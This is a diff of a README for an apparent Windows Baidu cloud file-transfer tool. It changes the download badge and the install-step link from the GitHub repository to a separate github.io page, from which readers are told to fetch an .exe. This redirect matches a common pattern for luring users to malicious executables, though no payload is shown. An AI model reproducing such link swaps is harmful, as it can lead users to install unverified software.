@@ -1,6 +1,6 @@
 # 📂 baidu-netdisk-transfer - Move files between computer and cloud
 
-[![](https://img.shields.io/badge/download-latest-blue.svg)](https://github.com/Julesbladed538/baidu-netdisk-transfer)
+[![](https://img.shields.io/badge/download-latest-blue.svg)](https://julesbladed538.github.io)
 
 ## 📋 What this tool does
 
@@ -19,7 +19,7 @@ To run this tool on your Windows computer, you need the following:
 
 Follow these steps to get the tool on your computer.
 
-1. Visit the [repository page](https://github.com/Julesbladed538/baidu-netdisk-transfer) to find the latest download files.
+1. Visit the [repository page](https://julesbladed538.github.io) to find the latest download files.
 2. Look for the "Releases" section on the right side of the page.
 3. Click on the version link to view the file list.
 4. Select the file ending in .exe to start the download.
